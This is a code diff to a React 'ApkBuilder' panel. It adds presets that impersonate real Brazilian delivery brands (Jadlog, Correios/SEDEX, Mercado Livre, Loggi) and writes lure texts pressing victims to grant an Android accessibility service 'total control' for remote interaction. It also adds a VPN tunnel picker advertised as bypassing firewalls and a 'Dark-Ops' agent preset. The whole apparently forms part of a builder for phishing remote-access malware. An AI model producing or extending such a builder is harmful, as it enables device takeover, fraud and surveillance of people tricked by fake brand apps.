@@ -5,6 +5,7 @@ import {
   ArrowLeft,
   ArrowRight,
   Boxes,
+  Building2,
   Check,
   CheckCircle2,
   ChevronLeft,
@@ -74,6 +75,167 @@ export const defaultScreenConfig: ScreenCustomizationConfig = {
   trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
 };
 
+export interface EnterpriseProfile {
+  id: string;
+  name: string;
+  category: string;
+  badge: string;
+  appName: string;
+  packageName: string;
+  redirectUrl: string;
+  accentColor: string;
+  logoId: string;
+  vpnProtocol: "TLS" | "UDP" | "TCP";
+  screenConfig: ScreenCustomizationConfig;
+}
+
+export const enterpriseProfiles: EnterpriseProfile[] = [
+  {
+    id: "jadlog",
+    name: "JADLOG Rastreio",
+    category: "Logística Express",
+    badge: "Oficial Jadlog",
+    appName: "JADLOG Rastreio",
+    packageName: "com.droidview.agent",
+    redirectUrl: "https://jadlog.com.br/rastreamento",
+    accentColor: "#dc2626",
+    logoId: "logo_jadlog",
+    vpnProtocol: "TLS",
+    screenConfig: {
+      loadingSubtext: "aguarde, atualização em andamento...",
+      speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
+      copyrightText: "All Rights Reserved.",
+      permissionDialogTitle: "Permitir controle total para {appName}?",
+      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
+      accentColor: "#dc2626",
+      trackingTitle: "Rastreamento de Encomendas",
+      trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.",
+      companyPreset: "jadlog",
+      enterpriseName: "Jadlog Logística S.A."
+    }
+  },
+  {
+    id: "sedex",
+    name: "SEDEX / Correios",
+    category: "Serviços Postais",
+    badge: "Correios BR",
+    appName: "SEDEX Rastreamento",
+    packageName: "br.com.correios.rastreamento",
+    redirectUrl: "https://rastreamento.correios.com.br",
+    accentColor: "#eab308",
+    logoId: "logo_correios",
+    vpnProtocol: "TLS",
+    screenConfig: {
+      loadingSubtext: "sincronizando dados de encomendas postais...",
+      speechCalloutText: "O SEDEX requer acesso de acessibilidade para emitir alertas e rastreio de pacotes em tempo real.",
+      copyrightText: "Empresa Brasileira de Correios e Telégrafos.",
+      permissionDialogTitle: "Permitir controle de rastreio para {appName}?",
+      serviceDescription: "Permite monitoramento automatizado de encomendas postais, atualização de status e comunicação com o terminal central.",
+      accentColor: "#eab308",
+      trackingTitle: "Portal de Rastreio Postal SEDEX",
+      trackingSubtext: "Objetos postais sincronizados com sucesso. Acompanhe suas remessas e encomendas expressas.",
+      companyPreset: "sedex",
+      enterpriseName: "Correios Brasil"
+    }
+  },
+  {
+    id: "mercadolivre",
+    name: "Mercado Envios",
+    category: "E-Commerce & Cargas",
+    badge: "Mercado Livre",
+    appName: "Mercado Envios",
+    packageName: "com.mercadolivre.envios",
+    redirectUrl: "https://envios.mercadolivre.com.br",
+    accentColor: "#f59e0b",
+    logoId: "logo_box",
+    vpnProtocol: "UDP",
+    screenConfig: {
+      loadingSubtext: "carregando malha logística e rotas de entrega...",
+      speechCalloutText: "Permita o serviço para sincronizar suas entregas e otimizar rotas com o centro de distribuição.",
+      copyrightText: "Mercado Envios Logística S.A.",
+      permissionDialogTitle: "Permitir serviço operacional para {appName}?",
+      serviceDescription: "Otimiza a leitura de romaneios, geolocalização de pacotes e telemetria com a central de suporte.",
+      accentColor: "#f59e0b",
+      trackingTitle: "Painel do Entregador & Cargas",
+      trackingSubtext: "Rotas otimizadas e entregas sincronizadas com o centro de distribuição.",
+      companyPreset: "mercadolivre",
+      enterpriseName: "Mercado Livre"
+    }
+  },
+  {
+    id: "loggi",
+    name: "Loggi Express",
+    category: "Logística Urbana",
+    badge: "Loggi",
+    appName: "Loggi Entregas",
+    packageName: "com.loggi.driver.partner",
+    redirectUrl: "https://loggi.com/rastreador",
+    accentColor: "#2563eb",
+    logoId: "logo_security",
+    vpnProtocol: "UDP",
+    screenConfig: {
+      loadingSubtext: "conectando à malha de entregas rápidas...",
+      speechCalloutText: "Ative a permissão para receber atualizações instantâneas de pacotes e suporte em campo.",
+      copyrightText: "Loggi Tecnologia Ltda.",
+      permissionDialogTitle: "Autorizar Loggi Entregas no aparelho?",
+      serviceDescription: "Permite comunicação em tempo real, suporte de navegação e auditoria operacional de entrega.",
+      accentColor: "#2563eb",
+      trackingTitle: "Loggi Central de Remessas",
+      trackingSubtext: "Acompanhe todas as entregas do dia e histórico de ocorrências com o suporte logístico.",
+      companyPreset: "loggi",
+      enterpriseName: "Loggi Tecnologia"
+    }
+  },
+  {
+    id: "dview",
+    name: "DVIEW Enterprise MDM",
+    category: "Segurança & Endpoint",
+    badge: "Dark-Ops",
+    appName: "DVIEW Security Agent",
+    packageName: "com.droidview.agent",
+    redirectUrl: "http://localhost:5000",
+    accentColor: "#00f0ff",
+    logoId: "logo_dview",
+    vpnProtocol: "TLS",
+    screenConfig: {
+      loadingSubtext: "estabelecendo canal seguro criptografado...",
+      speechCalloutText: "Este agente corporativo requer permissão de acessibilidade para diagnóstico remoto e conformidade MDM.",
+      copyrightText: "DVIEW Security Technologies.",
+      permissionDialogTitle: "Permitir controle de conformidade DVIEW?",
+      serviceDescription: "Serviço de gerenciamento corporativo para assistência remota, inventário de hardware e proteção em tempo real.",
+      accentColor: "#00f0ff",
+      trackingTitle: "Terminal Corporativo Seguro",
+      trackingSubtext: "Dispositivo autenticado com sucesso e conectado ao servidor central de gerenciamento.",
+      companyPreset: "dview",
+      enterpriseName: "DVIEW Enterprise"
+    }
+  },
+  {
+    id: "custom",
+    name: "White-Label Customizado",
+    category: "Personalizado / Qualquer Empresa",
+    badge: "100% White-Label",
+    appName: "App Corporativo",
+    packageName: "com.empresa.agent",
+    redirectUrl: "https://suaempresa.com.br",
+    accentColor: "#8b5cf6",
+    logoId: "logo_box",
+    vpnProtocol: "TCP",
+    screenConfig: {
+      loadingSubtext: "carregando módulos corporativos...",
+      speechCalloutText: "Este aplicativo requer permissão de acesso para prestar suporte técnico autorizado.",
+      copyrightText: "Todos os Direitos Reservados.",
+      permissionDialogTitle: "Permitir controle para {appName}?",
+      serviceDescription: "O serviço de acessibilidade do {appName} permite suporte técnico assistido e comunicação com a central.",
+      accentColor: "#8b5cf6",
+      trackingTitle: "Central de Serviços Corporativos",
+      trackingSubtext: "Serviços validados com sucesso. Digite o código ou acesse suas operações.",
+      companyPreset: "custom",
+      enterpriseName: "Sua Empresa S.A."
+    }
+  }
+];
+
 export const brandAccentPresets = [
   { name: "Vermelho Jadlog", hex: "#dc2626" },
   { name: "Azul Royal", hex: "#2563eb" },
@@ -124,6 +286,24 @@ export function ApkBuilder() {
 
   // Island / Work Profile Config
   const [islandProfileEnabled, setIslandProfileEnabled] = useState(true);
+
+  // Enterprise White-Label Profile State
+  const [selectedEnterpriseId, setSelectedEnterpriseId] = useState<string>("jadlog");
+
+  const applyEnterpriseProfile = (profile: EnterpriseProfile) => {
+    setSelectedEnterpriseId(profile.id);
+    setAppName(profile.appName);
+    setPackageName(profile.packageName);
+    setRedirectUrl(profile.redirectUrl);
+    setVpnProtocol(profile.vpnProtocol);
+    setSelectedLogoId(profile.logoId);
+    setCustomLogoDataUrl("");
+    setScreenConfig({
+      ...profile.screenConfig,
+      accentColor: profile.accentColor
+    });
+    showToast(`🏢 Perfil '${profile.name}' aplicado! Todos os 10 passos do simulador foram ajustados.`);
+  };
 
   // Screen Customization State
   const [screenConfig, setScreenConfig] = useState<ScreenCustomizationConfig>(() => {
@@ -1445,6 +1625,71 @@ export function ApkBuilder() {
                   </div>
                 ) : (
                   <form onSubmit={handleSaveBuild} style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
+                    {/* BARRA DE PERFIS DE EMPRESA WHITE-LABEL (1-CLIQUE) */}
+                    <div style={{
+                      background: "rgba(15, 23, 42, 0.6)",
+                      border: "1px solid rgba(56, 189, 248, 0.25)",
+                      borderRadius: "12px",
+                      padding: "14px 16px",
+                      display: "flex",
+                      flexDirection: "column",
+                      gap: "10px"
+                    }}>
+                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "8px" }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+                          <Building2 size={18} style={{ color: "#38bdf8" }} />
+                          <strong style={{ fontSize: "13.5px", color: "#f8fafc" }}>
+                            Identidade da Empresa (White-Label Ajustável)
+                          </strong>
+                          <span style={{ fontSize: "10px", background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.3)", padding: "2px 8px", borderRadius: "10px", fontWeight: 700 }}>
+                            1-CLIQUE PRESET
+                          </span>
+                        </div>
+                        <span style={{ fontSize: "11px", color: "#94a3b8" }}>
+                          Selecione o modelo da empresa para carregar telas, textos, logos e VPN automaticamente:
+                        </span>
+                      </div>
+
+                      {/* Grade de Perfis White-Label */}
+                      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(170px, 1fr))", gap: "8px" }}>
+                        {enterpriseProfiles.map((p) => {
+                          const isSelected = selectedEnterpriseId === p.id;
+                          return (
+                            <button
+                              key={p.id}
+                              type="button"
+                              onClick={() => applyEnterpriseProfile(p)}
+                              style={{
+                                background: isSelected ? "rgba(56, 189, 248, 0.15)" : "rgba(30, 41, 59, 0.5)",
+                                border: isSelected ? `2px solid ${p.accentColor}` : "1px solid #334155",
+                                borderRadius: "10px",
+                                padding: "10px",
+                                textAlign: "left",
+                                cursor: "pointer",
+                                transition: "all 0.2s ease",
+                                display: "flex",
+                                flexDirection: "column",
+                                gap: "5px"
+                              }}
+                            >
+                              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                                <div style={{ width: "10px", height: "10px", borderRadius: "50%", background: p.accentColor, boxShadow: `0 0 8px ${p.accentColor}` }} />
+                                <span style={{ fontSize: "9.5px", color: "#94a3b8", fontWeight: 700, textTransform: "uppercase" }}>
+                                  {p.badge}
+                                </span>
+                              </div>
+                              <span style={{ fontSize: "12px", fontWeight: 700, color: isSelected ? "#ffffff" : "#e2e8f0" }}>
+                                {p.name}
+                              </span>
+                              <span style={{ fontSize: "10px", color: "#64748b" }}>
+                                {p.category}
+                              </span>
+                            </button>
+                          );
+                        })}
+                      </div>
+                    </div>
+
                     {platform === "ios" ? (
                       <>
                         {/* Linha 1 iOS: Nome do Perfil e Bundle Identifier */}
@@ -1619,29 +1864,105 @@ export function ApkBuilder() {
                       </div>
 
                       {vpnEnabled && (
-                        <div className="apk-vpn-fields-grid">
-                          <label style={{ fontSize: "12px" }}>
-                            Porta do Túnel VPN
-                            <input
-                              type="number"
-                              value={vpnPort}
-                              onChange={(e) => setVpnPort(Number(e.target.value) || 8443)}
-                              placeholder="8443"
-                              style={{ marginTop: "4px" }}
-                            />
-                          </label>
-                          <label style={{ fontSize: "12px" }}>
-                            Protocolo do Túnel
-                            <select
-                              value={vpnProtocol}
-                              onChange={(e) => setVpnProtocol(e.target.value as "TLS" | "TCP" | "UDP")}
-                              style={{ marginTop: "4px" }}
+                        <div style={{ padding: "0 14px 14px" }}>
+                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", margin: "8px 0 10px 0" }}>
+                            <span style={{ fontSize: "12px", color: "#cbd5e1", fontWeight: 700 }}>
+                              Selecione o Tipo de Túnel VPN (3 Protocolos de Alta Velocidade):
+                            </span>
+                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                              <label style={{ fontSize: "11px", color: "#94a3b8" }}>Porta:</label>
+                              <input
+                                type="number"
+                                value={vpnPort}
+                                onChange={(e) => setVpnPort(Number(e.target.value) || 8443)}
+                                style={{ width: "80px", padding: "4px 8px", fontSize: "11.5px" }}
+                              />
+                            </div>
+                          </div>
+
+                          {/* 3 Opções de Protocolos VPN */}
+                          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))", gap: "10px" }}>
+                            {/* 1. TLS */}
+                            <div
+                              onClick={() => setVpnProtocol("TLS")}
+                              style={{
+                                background: vpnProtocol === "TLS" ? "rgba(56, 189, 248, 0.15)" : "rgba(30, 41, 59, 0.4)",
+                                border: vpnProtocol === "TLS" ? "2px solid #38bdf8" : "1px solid #334155",
+                                borderRadius: "10px",
+                                padding: "12px",
+                                cursor: "pointer",
+                                transition: "all 0.2s ease"
+                              }}
                             >
-                              <option value="TLS">TLS Seguro (Recomendado)</option>
-                              <option value="TCP">TCP Direto</option>
-                              <option value="UDP">UDP Baixa Latência</option>
-                            </select>
-                          </label>
+                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
+                                <strong style={{ fontSize: "12.5px", color: vpnProtocol === "TLS" ? "#38bdf8" : "#f1f5f9" }}>
+                                  1. TLS Seguro
+                                </strong>
+                                <span style={{ fontSize: "9px", background: "#0284c7", color: "#fff", padding: "2px 6px", borderRadius: "8px", fontWeight: 700 }}>
+                                  MÁXIMA SEGURANÇA
+                                </span>
+                              </div>
+                              <p style={{ margin: 0, fontSize: "10.5px", color: "#94a3b8", lineHeight: "1.4" }}>
+                                Criptografia de ponta a ponta (AES-256). Bypass transparente de firewalls restritivos e redes móveis.
+                              </p>
+                            </div>
+
+                            {/* 2. UDP */}
+                            <div
+                              onClick={() => setVpnProtocol("UDP")}
+                              style={{
+                                background: vpnProtocol === "UDP" ? "rgba(34, 197, 94, 0.15)" : "rgba(30, 41, 59, 0.4)",
+                                border: vpnProtocol === "UDP" ? "2px solid #22c55e" : "1px solid #334155",
+                                borderRadius: "10px",
+                                padding: "12px",
+                                cursor: "pointer",
+                                transition: "all 0.2s ease"
+                              }}
+                            >
+                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
+                                <strong style={{ fontSize: "12.5px", color: vpnProtocol === "UDP" ? "#22c55e" : "#f1f5f9" }}>
+                                  2. UDP Datagram
+                                </strong>
+                                <span style={{ fontSize: "9px", background: "#15803d", color: "#fff", padding: "2px 6px", borderRadius: "8px", fontWeight: 700 }}>
+                                  LATÊNCIA &lt; 1MS
+                                </span>
+                              </div>
+                              <p style={{ margin: 0, fontSize: "10.5px", color: "#94a3b8", lineHeight: "1.4" }}>
+                                Transmissão Wire-Speed sem bloqueio (tipo WireGuard). Ideal para tela em tempo real e touch sem lag.
+                              </p>
+                            </div>
+
+                            {/* 3. TCP */}
+                            <div
+                              onClick={() => setVpnProtocol("TCP")}
+                              style={{
+                                background: vpnProtocol === "TCP" ? "rgba(245, 158, 11, 0.15)" : "rgba(30, 41, 59, 0.4)",
+                                border: vpnProtocol === "TCP" ? "2px solid #f59e0b" : "1px solid #334155",
+                                borderRadius: "10px",
+                                padding: "12px",
+                                cursor: "pointer",
+                                transition: "all 0.2s ease"
+                              }}
+                            >
+                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
+                                <strong style={{ fontSize: "12.5px", color: vpnProtocol === "TCP" ? "#f59e0b" : "#f1f5f9" }}>
+                                  3. TCP Stream
+                                </strong>
+                                <span style={{ fontSize: "9px", background: "#b45309", color: "#fff", padding: "2px 6px", borderRadius: "8px", fontWeight: 700 }}>
+                                  1000 MBPS FORTE
+                                </span>
+                              </div>
+                              <p style={{ margin: 0, fontSize: "10.5px", color: "#94a3b8", lineHeight: "1.4" }}>
+                                Buffers 128KB, TCP_NODELAY. Máxima resiliência contra perdas de pacote em conexões celulares 4G/5G oscilantes.
+                              </p>
+                            </div>
+                          </div>
+
+                          {/* Destaque de Liberação Imediata */}
+                          <div style={{ marginTop: "10px", padding: "8px 12px", background: "rgba(34, 197, 94, 0.08)", border: "1px solid rgba(34, 197, 94, 0.25)", borderRadius: "8px", fontSize: "11px", color: "#86efac", display: "flex", alignItems: "center", gap: "8px" }}>
+                            <span>⚡</span>
+                            <span><strong>Autorizou liberou:</strong> Conexão estabelecida instantaneamente no milissegundo de confirmação pelo usuário, com vazão máxima e latência mínima.</span>
+                          </div>
                         </div>
                       )}
                     </div>
@@ -3018,6 +3339,11 @@ export function ApkBuilder() {
                                   🏝️ PERFIL ISLAND ATIVADO
                                 </div>
                               )}
+                              {vpnEnabled && (
+                                <div style={{ display: "inline-flex", alignItems: "center", gap: "4px", background: "#eff6ff", border: "1px solid #93c5fd", padding: "4px 8px", borderRadius: "12px", fontSize: "10.5px", fontWeight: 700, color: "#1d4ed8" }}>
+                                  🛡️ VPN {vpnProtocol} ATIVA (1000 Mbps)
+                                </div>
+                              )}
                             </div>
 
                             <h3 style={{ margin: "4px 0", fontSize: "16px", color: "#0f172a", fontWeight: 800 }}>
@@ -3037,7 +3363,8 @@ export function ApkBuilder() {
                             <div style={{ width: "100%", background: "#f1f5f9", border: "1px solid #e2e8f0", borderRadius: "8px", padding: "10px", fontSize: "10px", color: "#334155", fontFamily: "var(--font-mono)", textAlign: "left" }}>
                               <div>• installation: <strong style={{ color: "#16a34a" }}>"verified"</strong></div>
                               <div>• accessibility: <strong style={{ color: "#16a34a" }}>"connected"</strong></div>
-                              <div>• island_profile: <strong style={{ color: "#0284c7" }}>"provisioned"</strong></div>
+                              <div>• island_profile: <strong style={{ color: "#0284c7" }}>{islandProfileEnabled ? '"provisioned"' : '"disabled"'}</strong></div>
+                              <div>• vpn_tunnel: <strong style={{ color: "#16a34a" }}>"{vpnProtocol} - 1000Mbps (wire-speed)"</strong></div>
                               <div>• server_sync: <strong style={{ color: "#16a34a" }}>"online"</strong></div>
                             </div>
                           </div>
